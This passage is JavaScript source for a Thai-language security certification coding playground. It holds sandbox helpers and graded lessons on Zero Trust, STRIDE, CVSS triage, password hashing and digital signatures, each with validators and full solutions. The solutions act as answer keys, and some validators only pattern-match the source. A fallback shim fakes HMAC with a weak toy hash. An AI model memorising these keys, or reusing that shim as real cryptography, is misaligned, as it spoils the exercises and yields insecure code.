(function() {
// Application Security & Cyber Defense Interactive Coding Playground
// Dual-Focus Curriculum:
// 1. CompTIA Security+ (SY0-701) & ISC2 Core (CIA Triad, STRIDE, CVSS, Cryptography, PKI, Security Architecture, SIEM & NIST Incident Response)
// 2. Offensive AppSec & OWASP Top 10 (eJPT / PortSwigger Web Security Practitioner: IDOR/BOLA, SQLi, RCE, Path Traversal, XSS, CSP, CSRF, SSRF, CORS, WAF, DevSecOps SAST/Secret Scanning/SBOM)

function stripComments(code) {
  return code
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(?<!:)\/\/.*$/gm, '');
}

// Sandbox execution helpers for real behavioral & attack-vector testing
function execLearnerCode(code, params, expr) {
  const strippedImports = code.replace(/^\s*import\s+.*?;?\s*$/gm, '');
  const names = Object.keys(params);
  const values = names.map((n) => params[n]);
  const factory = new Function(...names, `${strippedImports}\nreturn (${expr});`);
  return factory(...values);
}

// Cross-environment shims for Node & Browser sandbox execution
const sandboxBuffer = (typeof Buffer !== 'undefined') ? Buffer : {
  from: (str, enc) => {
    if (enc === 'base64url' || enc === 'base64') {
      let b64 = String(str).replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4) b64 += '=';
      const decoded = typeof atob === 'function' ? atob(b64) : '';
      return {
        toString: () => decoded,
        length: decoded.length
      };
    }
    return {
      toString: (outEnc) => {
        if (outEnc === 'base64url') {
          const raw = typeof btoa === 'function' ? btoa(String(str)) : '';
          return raw.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        }
        return String(str);
      },
      length: String(str).length
    };
  }
};

const sandboxCrypto = (typeof crypto !== 'undefined' && crypto.createHmac && crypto.timingSafeEqual) ? crypto : {
  createHmac: (alg, secret) => {
    let payload = '';
    return {
      update: (chunk) => {
        payload += String(chunk);
        return this;
      },
      digest: (format) => {
        // Fast deterministic pseudo-HMAC digest for sandbox environments lacking native node:crypto
        let hash = 0;
        const combined = String(secret) + ':' + payload;
        for (let i = 0; i < combined.length; i++) {
          hash = ((hash << 5) - hash) + combined.charCodeAt(i);
          hash |= 0;
        }
        const hex = Math.abs(hash).toString(16).padStart(64, 'a');
        if (format === 'base64url') {
          return hex.slice(0, 43);
        }
        return hex;
      }
    };
  },
  timingSafeEqual: (bufA, bufB) => {
    if (bufA.length !== bufB.length) return false;
    let diff = 0;
    for (let i = 0; i < bufA.length; i++) {
      const valA = typeof bufA[i] === 'number' ? bufA[i] : String(bufA).charCodeAt(i);
      const valB = typeof bufB[i] === 'number' ? bufB[i] : String(bufB).charCodeAt(i);
      diff |= (valA ^ valB);
    }
    return diff === 0;
  }
};

const sandboxPath = (typeof path !== 'undefined' && path.resolve) ? path : {
  resolve: (...parts) => {
    let segments = [];
    for (const part of parts) {
      if (typeof part === 'string' && part.startsWith('/')) segments = [];
      const sub = String(part).split(/[\\/]/);
      for (const s of sub) {
        if (!s || s === '.') continue;
        if (s === '..') segments.pop();
        else segments.push(s);
      }
    }
    return '/' + segments.join('/');
  }
};

function getLearnerFn(code, fnName, extraParams = {}) {
  let fn;
  const params = {
    crypto: sandboxCrypto,
    Buffer: sandboxBuffer,
    path: sandboxPath,
    URL: (typeof URL !== 'undefined' ? URL : (typeof globalThis !== 'undefined' ? globalThis.URL : undefined)),
    ...extraParams
  };
  try {
    fn = execLearnerCode(code, params, `typeof ${fnName} === "function" ? ${fnName} : undefined`);
  } catch (err) {
    throw new Error(`โค้ดมี error ขณะรัน: ${err.message}`);
  }
  if (typeof fn !== "function") {
    throw new Error(`ไม่พบการประกาศ function ${fnName}()`);
  }
  return fn;
}

const LESSONS = [
  // ==========================================
  // MODULE 1: CYBERSECURITY FUNDAMENTALS & THREAT MODELING (Security+ Core)
  // ==========================================
  {
    id: "cia_triad_zero_trust",
    meta: "โมดูล 1: พื้นฐาน",
    title: "CIA Triad & Zero Trust: เสาหลักความปลอดภัยและสถาปัตยกรรม Never Trust, Always Verify",
    template: `// สถานการณ์: ออกแบบฟังก์ชันตรวจสอบการเข้าถึงทรัพยากรตามหลักการ Zero Trust
// กฎเหล็กของ Zero Trust: "Never Trust, Always Verify" และ "Principle of Least Privilege"
// 1. ตรวจสอบว่า request.authenticated ต้องเป็น true (Verify Explicitly)
//    หากไม่ใช่ ให้คืน { allow: false, reason: 'Unauthenticated: Verify explicitly failed' }
// 2. ตรวจสอบว่า user.permissions ต้องมี requiredPermission (Least Privilege)
//    หากไม่มี ให้คืน { allow: false, reason: 'Forbidden: Least privilege violation' }
// 3. หากผ่านเงื่อนไขครบถ้วน ให้คืน { allow: true }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบ Policy Guard ตามหลักการ Zero Trust (Functional Behavioral Test)...");
      const stripped = stripComments(code);
      const fn = getLearnerFn(code, 'verifyZeroTrustAccess');

      // 1. Verify Explicitly: Unauthenticated request must be rejected
      const unauth = fn({ authenticated: false, requiredPermission: 'admin:read' }, { permissions: ['admin:read'] });
      if (!unauth || unauth.allow !== false || !/Unauthenticated/i.test(unauth.reason)) {
        throw new Error("เมื่อ request.authenticated เป็น false ต้องคืน { allow: false, reason: 'Unauthenticated: Verify explicitly failed' } ตามหลัก Verify Explicitly");
      }

      // 2. Least Privilege: Missing required permission must be rejected
      const forbidden = fn({ authenticated: true, requiredPermission: 'admin:write' }, { permissions: ['user:read'] });
      if (!forbidden || forbidden.allow !== false || !/Least privilege/i.test(forbidden.reason)) {
        throw new Error("เมื่อ permissions ไม่ครอบคลุม requiredPermission ต้องคืน { allow: false, reason: 'Forbidden: Least privilege violation' } ตามหลัก Least Privilege");
      }

      // 3. Fully authorized request must pass
      const allowed = fn({ authenticated: true, requiredPermission: 'admin:read' }, { permissions: ['admin:read', 'user:read'] });
      if (!allowed || allowed.allow !== true) {
        throw new Error("เมื่อผ่านเงื่อนไข Zero Trust ครบถ้วน ต้องคืน { allow: true }");
      }
      log("✓ ยืนยันได้ว่า Policy Guard ทำงานถูกต้องตามหลัก Zero Trust (Verify Explicitly + Least Privilege)");
    },
    hint: "สร้างฟังก์ชัน verifyZeroTrustAccess(request, user) โดยเริ่มจาก if (!request.authenticated) คืน error จากนั้น if (!user.permissions || !user.permissions.includes(request.requiredPermission)) คืน forbidden แล้วจบด้วย return { allow: true }",
    solution: `function verifyZeroTrustAccess(request, user) {
  if (!request.authenticated) {
    return { allow: false, reason: 'Unauthenticated: Verify explicitly failed' };
  }
  if (!user.permissions || !user.permissions.includes(request.requiredPermission)) {
    return { allow: false, reason: 'Forbidden: Least privilege violation' };
  }
  return { allow: true };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจเสาหลักของ Cybersecurity (CIA Triad) และกระบวนทัศน์สถาปัตยกรรมยุคใหม่ <strong>Zero Trust Architecture (ZTA)</strong><br/><br/>
    ⚖️ <strong>CIA Triad — 3 เสาหลักความมั่นคงปลอดภัย:</strong><br/>
    • <strong>Confidentiality (ความลับ):</strong> ป้องกันไม่ให้ผู้ไม่มีสิทธิ์เข้าถึงข้อมูล (ควบคุมด้วย Encryption, Access Control, MFA)<br/>
    • <strong>Integrity (ความถูกต้องสมบูรณ์):</strong> มั่นใจว่าข้อมูลไม่ถูกแอบแก้ไขหรือปลอมแปลง (ควบคุมด้วย Hashing, Digital Signature, Checksum)<br/>
    • <strong>Availability (ความพร้อมใช้งาน):</strong> ระบบและข้อมูลพร้อมให้บริการเสมอเมื่อต้องการ (ควบคุมด้วย Redundancy, DDoS Protection, Backups)<br/><br/>
    🛡️ <strong>Zero Trust Architecture (NIST SP 800-207):</strong><br/>
    ในอดีต Security ใช้โมเดล <em>Perimeter Security (กำแพงปราสาท)</em> คือกั้นคนนอก แต่ไว้ใจคนในเครือข่าย ปัจจุบันถูกแทนที่ด้วย <strong>Zero Trust: "Never Trust, Always Verify"</strong><br/>
    1. <strong>Verify Explicitly:</strong> ยืนยันตัวตนและอุปกรณ์ทุกครั้ง ทุกคำขอ ไม่ว่าจะมาจากภายนอกหรือภายในองค์กร<br/>
    2. <strong>Least Privilege:</strong> ให้สิทธิ์ขั้นต่ำสุดเท่าที่จำเป็นต่อการปฏิบัติงานเท่านั้น (Just-In-Time & Just-Enough-Access)<br/>
    3. <strong>Assume Breach:</strong> ออกแบบระบบโดยตั้งสมมติฐานว่าเครือข่ายถูกเจาะอยู่เสมอ เพื่อทำ Microsegmentation จำกัดความเสียหาย<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 1 & 3):</strong><br/>
    ข้อสอบ Security+ มักยกกรณีศึกษา เช่น <em>"เซิร์ฟเวอร์โดน Ransomware เข้ารหัสจนใช้งานไม่ได้"</em> ถามว่ากระทบเสาใดของ CIA? คำตอบคือ <strong>Availability</strong> (และอาจกระทบ Confidentiality หากมี data exfiltration) หรือถามว่า <em>"หลักการใดจำกัดความเสียหายเมื่อบัญชีผู้ใช้ถูกแฮก"</em> คำตอบคือ <strong>Least Privilege</strong>`,
    example: `// ตัวอย่างการใช้งาน Zero Trust Guard
const req = { authenticated: true, requiredPermission: 'finance:transfer' };
const user = { id: 'u1', permissions: ['finance:view'] };
const result = verifyZeroTrustAccess(req, user);
// result => { allow: false, reason: 'Forbidden: Least privilege violation' }`,
    task: `จงเขียนฟังก์ชัน <code>verifyZeroTrustAccess(request, user)</code> ให้สมบูรณ์ โดย:<br/>
    1. ตรวจสอบ <code>!request.authenticated</code> หากไม่ผ่าน คืน <code>{ allow: false, reason: 'Unauthenticated: Verify explicitly failed' }</code><br/>
    2. ตรวจสอบสิทธิ์ <code>user.permissions.includes(request.requiredPermission)</code> หากไม่ผ่าน คืน <code>{ allow: false, reason: 'Forbidden: Least privilege violation' }</code><br/>
    3. หากผ่านทั้งหมด คืน <code>{ allow: true }</code>`
  },
  {
    id: "threat_modeling_stride",
    meta: "โมดูล 1: พื้นฐาน",
    title: "Threat Modeling: วิเคราะห์และจำแนกภัยคุกคามด้วย STRIDE Framework",
    template: `// สถานการณ์: ทำ Threat Modeling ให้ระบบรับชำระเงินด้วยโมเดล STRIDE
// STRIDE เป็นเฟรมเวิร์กของ Microsoft ที่ใช้ค้นหาภัยคุกคามตั้งแต่ขั้นตอนการออกแบบระบบ
// จงเขียนฟังก์ชัน classifyThreat(threatType) ที่จับคู่ประเภทของภัยคุกคามกับ Security Control ที่เหมาะสม:
// - 'Spoofing'                 -> 'Strong Authentication (MFA)'
// - 'Tampering'                -> 'Digital Signatures or Hashes'
// - 'Repudiation'              -> 'Cryptographic Audit Logging'
// - 'Information Disclosure'   -> 'Encryption at Rest and in Transit'
// - 'Denial of Service'        -> 'Rate Limiting or Redundancy'
// - 'Elevation of Privilege'   -> 'Role-Based Access Control (RBAC)'
// คืนค่าเป็น Object: { category: threatType, primaryMitigation: ... }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการจำแนกประเภท Threat Modeling ตามโมเดล STRIDE...");
      const stripped = stripComments(code);
      const hasSpoofing = /Spoofing/.test(stripped) && /MFA|Authentication/.test(stripped);
      const hasTampering = /Tampering/.test(stripped) && /Digital Signatures|Hashes/.test(stripped);
      const hasRepudiation = /Repudiation/.test(stripped) && /Audit|Logging/.test(stripped);
      const hasInfoDisclosure = /Information Disclosure/.test(stripped) && /Encryption/.test(stripped);
      const hasDoS = /Denial of Service/.test(stripped) && /Rate Limit|Redundancy/.test(stripped);
      const hasEoP = /Elevation of Privilege/.test(stripped) && /RBAC|Access Control/.test(stripped);
      if (!hasSpoofing || !hasTampering || !hasRepudiation || !hasInfoDisclosure || !hasDoS || !hasEoP) {
        throw new Error("ยังจับคู่ประเภทภัยคุกคาม STRIDE กับกลไกบรรเทาความเสี่ยง (Mitigation) ไม่ครบถ้วนทั้ง 6 หมวด");
      }
      log("✓ ยืนยันได้ว่าเข้าใจการจำแนกภัยคุกคาม STRIDE ครบทั้ง 6 หมวดหมู่อย่างถูกต้อง");
    },
    hint: "สร้าง object map ที่เก็บ key เป็นชื่อตัวอักษรของ STRIDE ทั้ง 6 ตัว และ value เป็นข้อความ primary mitigation ตามโจทย์ จากนั้นดึงค่าออกมาสร้าง object { category: threatType, primaryMitigation: ... }",
    solution: `function classifyThreat(threatType) {
  const mitigations = {
    Spoofing: 'Strong Authentication (MFA)',
    Tampering: 'Digital Signatures or Hashes',
    Repudiation: 'Cryptographic Audit Logging',
    'Information Disclosure': 'Encryption at Rest and in Transit',
    'Denial of Service': 'Rate Limiting or Redundancy',
    'Elevation of Privilege': 'Role-Based Access Control (RBAC)'
  };
  return {
    category: threatType,
    primaryMitigation: mitigations[threatType] || 'Defense-in-Depth'
  };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจกระบวนการทำ <strong>Threat Modeling</strong> ในขั้นตอน Shift-Left Security ด้วย <strong>STRIDE Framework</strong><br/><br/>
    ⚖️ <strong>ถอดรหัส STRIDE และเป้าหมายความปลอดภัย:</strong><br/>
    • <strong>S - Spoofing (การสวมรอยตัวตน):</strong> แอบอ้างเป็นบุคคลหรือระบบอื่น ➡️ <em>เป้าหมาย: Authentication</em><br/>
    • <strong>T - Tampering (การแอบแก้ไขข้อมูล):</strong> แก้ไขโค้ด ฐานข้อมูล หรือข้อมูลในเครือข่าย ➡️ <em>เป้าหมาย: Integrity</em><br/>
    • <strong>R - Repudiation (การปฏิเสธความรับผิดชอบ):</strong> ผู้ใช้ปฏิเสธว่าไม่ได้ทำธุรกรรมนั้น ➡️ <em>เป้าหมาย: Non-Repudiation (Audit Logs)</em><br/>
    • <strong>I - Information Disclosure (ข้อมูลรั่วไหล):</strong> เผยแพร่ข้อมูลลับสู่สาธารณะ ➡️ <em>เป้าหมาย: Confidentiality (Encryption)</em><br/>
    • <strong>D - Denial of Service (ทำให้ระบบล่ม):</strong> ขัดขวางไม่ให้ผู้ใช้เข้าถึงบริการได้ ➡️ <em>เป้าหมาย: Availability (Rate Limiting)</em><br/>
    • <strong>E - Elevation of Privilege (การยกระดับสิทธิ์):</strong> ผู้ใช้ทั่วไปแอบได้สิทธิ์ระดับ Admin ➡️ <em>เป้าหมาย: Authorization (Least Privilege)</em><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & ISC2 SSCP):</strong><br/>
    ข้อสอบมักถามจับคู่ Threat กับ Security Property เสมอ เช่น <em>"การที่ผู้ส่งปฏิเสธว่าไม่ได้ส่งอีเมลคำสั่งซื้อ แก้ไขได้ด้วยกลไกใด?"</em> คำตอบคือ <strong>Non-Repudiation ผ่าน Digital Signatures และ Secure Audit Trails</strong>`,
    example: `const threat = classifyThreat('Tampering');
// threat => { category: 'Tampering', primaryMitigation: 'Digital Signatures or Hashes' }`,
    task: `จงเขียนฟังก์ชัน <code>classifyThreat(threatType)</code> ให้สมบูรณ์ โดยส่งคืน Object <code>{ category, primaryMitigation }</code> ที่แมปภัยคุกคาม STRIDE ทั้ง 6 หมวดเข้ากับกลไกป้องกันที่ระบุไว้ในโจทย์`
  },
  {
    id: "cvss_cve_scoring",
    meta: "โมดูล 1: พื้นฐาน",
    title: "Vulnerability Triage: การอ่าน CVSS v3.1 Vector และจัดลำดับความเสี่ยง CVE",
    template: `// สถานการณ์: ทำระบบ Automated Triage สำหรับจัดลำดับความเร่งด่วนในการ Patch ช่องโหว่ CVE
// อิงตามมาตรฐาน CVSS v3.1 (Common Vulnerability Scoring System):
// 1. ช่องโหว่ที่เป็น Network Attack (AV:N), Complexity ต่ำ (AC:L), ไม่ต้องใช้สิทธิ์ (PR:N)
//    หรือ Base Score >= 9.0 จัดเป็นความเสี่ยงระดับ 'CRITICAL' ต้องมี SLA แก้ไขใน 24 ชั่วโมง
// 2. หาก Base Score >= 7.0 จัดเป็นระดับ 'HIGH' ต้องมี SLA แก้ไขใน 72 ชั่วโมง
// 3. นอกเหนือจากนั้น จัดเป็นระดับ 'MEDIUM' มี SLA แก้ไขใน 168 ชั่วโมง (7 วัน)
// จงเขียนฟังก์ชัน triageVulnerability(cvssVector, baseScore) คืนค่า { severity, slaHours }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำ Vulnerability Triage ตามมาตรฐาน CVSS...");
      const stripped = stripComments(code);
      const hasVectorChecks = /AV:N/.test(stripped) && /AC:L/.test(stripped) && /PR:N/.test(stripped);
      const hasCriticalScore = /9\.0|9/.test(stripped);
      const hasHighCheck = /7\.0|7/.test(stripped);
      const hasSlaValues = /24/.test(stripped) && /72/.test(stripped) && /168/.test(stripped);
      if (!hasVectorChecks && !hasCriticalScore) {
        throw new Error("ไม่พบการตรวจสอบเงื่อนไขความเสี่ยงระดับ CRITICAL ตามค่า Vector หรือ Base Score");
      }
      if (!hasHighCheck || !hasSlaValues) {
        throw new Error("ไม่พบการตรวจสอบระดับ HIGH หรือกำหนดค่า SLA ชั่วโมงแก้ไขตามที่โจทย์กำหนด");
      }
      log("✓ ยืนยันได้ว่าสามารถคำนวณระดับความรุนแรงและ SLA ช่องโหว่ตามเกณฑ์ CVSS ได้ถูกต้อง");
    },
    hint: "สร้างเงื่อนไขเช็ค if (baseScore >= 9.0 || (cvssVector.includes('AV:N') && cvssVector.includes('AC:L') && cvssVector.includes('PR:N') && baseScore >= 8.5)) return { severity: 'CRITICAL', slaHours: 24 } แล้วตามด้วยเงื่อนไข HIGH และ MEDIUM",
    solution: `function triageVulnerability(cvssVector, baseScore) {
  const isRemoteUnauth = cvssVector.includes('AV:N') && cvssVector.includes('AC:L') && cvssVector.includes('PR:N');
  if (baseScore >= 9.0 || (isRemoteUnauth && baseScore >= 8.5)) {
    return { severity: 'CRITICAL', slaHours: 24 };
  }
  if (baseScore >= 7.0) {
    return { severity: 'HIGH', slaHours: 72 };
  }
  return { severity: 'MEDIUM', slaHours: 168 };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการประเมินความรุนแรงของช่องโหว่ความปลอดภัยด้วยมาตรฐาน <strong>CVSS (Common Vulnerability Scoring System)</strong><br/><br/>
    ⚖️ <strong>โครงสร้างคะแนน CVSS v3.1 (Base Score 0.0 - 10.0):</strong><br/>
    • <strong>None:</strong> 0.0 | <strong>Low:</strong> 0.1 - 3.9 | <strong>Medium:</strong> 4.0 - 6.9 | <strong>High:</strong> 7.0 - 8.9 | <strong>Critical:</strong> 9.0 - 10.0<br/><br/>
    🔍 <strong>ถอดรหัส CVSS Vector String ที่พบบ่อย:</strong><br/>
    ตัวอย่าง: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> (Score 9.8 Critical)<br/>
    • <strong>AV (Attack Vector):</strong> N (Network - โจมตีข้ามเน็ตได้), L (Local), P (Physical)<br/>
    • <strong>AC (Attack Complexity):</strong> L (Low - ยิงได้ทันที), H (High - ต้องมีเงื่อนไขพิเศษ)<br/>
    • <strong>PR (Privileges Required):</strong> N (None - ไม่ต้องล็อกอิน), L (Low), H (High - สิทธิ์ Admin)<br/>
    • <strong>UI (User Interaction):</strong> N (None - เหยื่อไม่ต้องทำอะไร), R (Required - เหยื่อต้องกดคลิก)<br/>
    • <strong>C / I / A:</strong> Impact ต่อ Confidentiality, Integrity, Availability (N = None, L = Low, H = High)<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & CySA+):</strong><br/>
    ข้อสอบมักให้โจทย์เปรียบเทียบว่าช่องโหว่ใดควร Patch ก่อนระหว่าง CVE ที่มี <code>AV:N/PR:N</code> (Remote Unauthenticated) กับ CVE ที่ต้องการ <code>AV:L/PR:H</code> (Local Admin) — แม้คะแนนจะใกล้กัน ช่องโหว่ที่เป็น <strong>Remote Unauthenticated (AV:N/PR:N) ต้องได้รับการแก้ไขเร่งด่วนที่สุดเสมอ</strong>`,
    example: `const report = triageVulnerability('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 9.8);
// report => { severity: 'CRITICAL', slaHours: 24 }`,
    task: `จงเขียนฟังก์ชัน <code>triageVulnerability(cvssVector, baseScore)</code> โดย:<br/>
    1. ถ้า <code>baseScore >= 9.0</code> หรือเป็น Remote Unauthenticated (<code>AV:N</code>, <code>AC:L</code>, <code>PR:N</code> ที่คะแนนสูง) คืน <code>{ severity: 'CRITICAL', slaHours: 24 }</code><br/>
    2. ถ้า <code>baseScore >= 7.0</code> คืน <code>{ severity: 'HIGH', slaHours: 72 }</code><br/>
    3. นอกนั้น คืน <code>{ severity: 'MEDIUM', slaHours: 168 }</code>`
  },

  // ==========================================
  // MODULE 2: CRYPTOGRAPHY & IDENTITY DEFENSE
  // ==========================================
  {
    id: "crypto_hashing_salting",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "Password Hashing & Salting: เลิกใช้ MD5/SHA-256 และทำความเข้าใจ Slow Hashing",
    template: `// สถานการณ์: ตรวจสอบความปลอดภัยของการจัดเก็บรหัสผ่าน (Password Storage Policy)
// ในฐานข้อมูล ห้ามเก็บรหัสผ่านด้วย Fast Hashing เดี่ยวๆ (MD5, SHA1, Plain SHA256) เด็ดขาด
// ต้องใช้ Slow Adaptive Hashing (bcrypt, argon2id) พร้อม Salt เสมอ
// จงเขียนฟังก์ชัน validatePasswordStorage(algorithm, hasSalt, workFactor):
// 1. หาก algorithm เป็น 'MD5' หรือ 'SHA1' หรือ 'SHA256_PLAIN' ให้ throw Error ว่าไม่ปลอดภัย
// 2. หาก hasSalt เป็น false ให้ throw Error ว่าจำเป็นต้องมี Salt เพื่อกัน Rainbow Tables
// 3. หากเป็น 'bcrypt' หรือ 'argon2id' และ workFactor >= 10 ให้คืน { secure: true, algorithm }
//    หาก workFactor < 10 ให้ throw Error ว่า work factor ต่ำเกินไป
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบ Password Storage Policy และกลไก Hashing/Salting (Behavioral Verification)...");
      const stripped = stripComments(code);
      const fn = getLearnerFn(code, 'validatePasswordStorage');

      // 1. Insecure fast hashes must throw
      let threwMd5 = false;
      try { fn('MD5', true, 12); } catch (e) { threwMd5 = true; }
      if (!threwMd5) throw new Error("อัลกอริทึม MD5 ไม่ปลอดภัยต่อ GPU brute force ต้อง throw Error ปฏิเสธ");

      let threwSha1 = false;
      try { fn('SHA1', true, 12); } catch (e) { threwSha1 = true; }
      if (!threwSha1) throw new Error("อัลกอริทึม SHA1 ไม่ปลอดภัย ต้อง throw Error ปฏิเสธ");

      // 2. Missing salt must throw
      let threwNoSalt = false;
      try { fn('bcrypt', false, 12); } catch (e) { threwNoSalt = true; }
      if (!threwNoSalt) throw new Error("หากไม่มี Salt (hasSalt: false) ต้อง throw Error ป้องกัน Rainbow Table Attack");

      // 3. Low work factor must throw
      let threwLowWork = false;
      try { fn('bcrypt', true, 8); } catch (e) { threwLowWork = true; }
      if (!threwLowWork) throw new Error("หาก workFactor < 10 ต้อง throw Error กำหนดขั้นต่ำ");

      // 4. Valid slow adaptive hash must return { secure: true }
      const validBcrypt = fn('bcrypt', true, 12);
      if (!validBcrypt || validBcrypt.secure !== true) {
        throw new Error("เมื่อใช้ bcrypt/argon2id พร้อม salt และ workFactor >= 10 ต้องคืน { secure: true, ... }");
      }
      log("✓ ยืนยันได้ว่าเข้าใจความแตกต่างของ Fast Hash กับ Adaptive Salted Hash อย่างถูกต้อง");
    },
    hint: "เช็ค blacklist algorithm ก่อนด้วย array ['MD5', 'SHA1', 'SHA256_PLAIN'].includes(algorithm.toUpperCase()) ถ้าเจอให้ throw ทันที จากนั้น if (!hasSalt) throw จากนั้นตรวจ workFactor < 10",
    solution: `function validatePasswordStorage(algorithm, hasSalt, workFactor) {
  const insecure = ['MD5', 'SHA1', 'SHA256_PLAIN'];
  if (insecure.includes(algorithm.toUpperCase())) {
    throw new Error('Insecure algorithm: vulnerable to GPU brute force');
  }
  if (!hasSalt) {
    throw new Error('Missing salt: vulnerable to rainbow tables');
  }
  if ((algorithm === 'bcrypt' || algorithm === 'argon2id') && workFactor >= 10) {
    return { secure: true, algorithm, workFactor };
  }
  throw new Error('Work factor too low: minimum 10 required');
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจความแตกต่างระหว่าง Fast Hashing กับ Slow Adaptive Hashing และบทบาทของ <strong>Salt</strong> ในการปกป้องรหัสผ่าน<br/><br/>
    ⚖️ <strong>ทำไม MD5 และ SHA-256 ถึงห้ามใช้เก็บรหัสผ่าน:</strong><br/>
    MD5 และ SHA-256 ถูกออกแบบมาให้ <strong>"คำนวณเร็วที่สุดเท่าที่จะทำได้"</strong> สำหรับเช็ค Integrity ของไฟล์ขนาดใหญ่ การนำมาใช้เก็บรหัสผ่านจึงเป็นช่องโหว่ร้ายแรง เพราะการ์ดจอ (GPU) สมัยใหม่สามารถทดลองรหัสผ่านได้หลายหมื่นล้านครั้งต่อวินาที (Brute-Force Attack)<br/><br/>
    🛡️ <strong>Salt คืออะไร และแก้ปัญหาอะไร:</strong><br/>
    • <strong>Rainbow Table:</strong> ฐานข้อมูล Hash ล่วงหน้าของคำศัพท์นับพันล้านคำ<br/>
    • <strong>Salt:</strong> สตริงสุ่มแบบ Cryptographic ความยาวอย่างน้อย 16 bytes ที่สร้างใหม่สำหรับผู้ใช้ทุกคนโดยไม่ซ้ำกัน ก่อนนำไป Hash รวมกับรหัสผ่าน ทำให้ผู้ใช้สองคนที่ใช้รหัสผ่านเดียวกันได้ค่า Hash ที่ต่างกันโดยสิ้นเชิง <strong>ทำลาย Rainbow Table ทันที</strong><br/><br/>
    🐢 <strong>Adaptive Slow Hashing (bcrypt, Argon2, PBKDF2):</strong><br/>
    มีพารามิเตอร์ <strong>Work Factor (Cost Factor)</strong> ที่ทำให้การคำนวณ Hash 1 ครั้งกินเวลาตามที่กำหนด (เช่น 250ms) แม้การ์ดจอของแฮกเกอร์จะแรงแค่ไหน ก็ไม่สามารถเดารหัสผ่านแบบ Massively Parallel ได้<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 1):</strong><br/>
    ข้อสอบมักถามว่า: <em>"เทคนิคใดช่วยป้องกัน Rainbow Table Attack?"</em> ➡️ คำตอบคือ <strong>Salting</strong> | <em>"เทคนิคใดเพิ่มความยากในการคำนวณเพื่อป้องกัน Brute Force?"</em> ➡️ คำตอบคือ <strong>Key Stretching (เช่น PBKDF2, bcrypt)</strong>`,
    example: `// การใช้งานที่ถูกต้อง
const policy = validatePasswordStorage('argon2id', true, 12);
// policy => { secure: true, algorithm: 'argon2id', workFactor: 12 }`,
    task: `จงเขียนฟังก์ชัน <code>validatePasswordStorage(algorithm, hasSalt, workFactor)</code> โดย:<br/>
    1. ปฏิเสธ <code>MD5</code>, <code>SHA1</code>, <code>SHA256_PLAIN</code> ด้วยการ throw Error<br/>
    2. ปฏิเสธกรณี <code>hasSalt === false</code> ด้วยการ throw Error<br/>
    3. ตรวจสอบ <code>bcrypt</code> หรือ <code>argon2id</code> พร้อม <code>workFactor >= 10</code> ให้คืน <code>{ secure: true, algorithm, workFactor }</code>`
  },
  {
    id: "crypto_symmetric_asymmetric",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "Symmetric vs Asymmetric Encryption & Digital Signatures",
    template: `// สถานการณ์: สร้างฟังก์ชันตรวจสอบ Digital Signature ด้วย Node.js crypto module
// Digital Signature ใช้ยืนยัน Integrity, Authenticity, และ Non-Repudiation (ปฏิเสธไม่ได้)
// หลักการ: ผู้ส่ง Sign ข้อมูลด้วย Private Key ของตนเอง -> ผู้รับนำ Public Key มา Verify
// 1. นำเข้า crypto module (import crypto from 'node:crypto')
// 2. เขียนฟังก์ชัน verifyDigitalSignature(data, signature, publicKey)
// 3. สร้างตัว verify ด้วย crypto.createVerify('SHA256')
// 4. update ข้อมูล แล้วเรียก .verify(publicKey, signature, 'hex') คืนผลลัพธ์ boolean
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการสร้างและการตรวจสอบ Digital Signature...");
      const stripped = stripComments(code);
      const hasCryptoImport = /crypto/.test(stripped);
      const hasCreateVerify = /crypto\.createVerify\(['"]SHA256['"]\)/.test(stripped);
      const hasUpdate = /\.update\(\s*\w+\s*\)/.test(stripped);
      const hasVerifyCall = /\.verify\(\s*\w+\s*,\s*\w+\s*,\s*['"]hex['"]\s*\)/.test(stripped);
      if (!hasCryptoImport) {
        throw new Error("ไม่พบการใช้งาน crypto module");
      }
      if (!hasCreateVerify) {
        throw new Error("ไม่พบการสร้าง Verify object ด้วย crypto.createVerify('SHA256')");
      }
      if (!hasUpdate || !hasVerifyCall) {
        throw new Error("ไม่พบการ update ข้อมูลหรือเรียกฟังก์ชัน .verify(publicKey, signature, 'hex')");
      }
      log("✓ ยืนยันได้ว่ากระบวนการตรวจสอบ Digital Signature ทำงานถูกต้องตามมาตรฐาน PKI");
    },
    hint: "ใช้ crypto.createVerify('SHA256') จากนั้น verify.update(data); verify.end(); return verify.verify(publicKey, signature, 'hex');",
    solution: `import crypto from 'node:crypto';

function verifyDigitalSignature(data, signature, publicKey) {
  const verify = crypto.createVerify('SHA256');
  verify.update(data);
  verify.end();
  return verify.verify(publicKey, signature, 'hex');
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจความแตกต่างระหว่าง Symmetric Encryption, Asymmetric Encryption และการทำงานของ <strong>Digital Signatures</strong><br/><br/>
    ⚖️ <strong>เปรียบเทียบ Symmetric vs Asymmetric Encryption:</strong><br/>
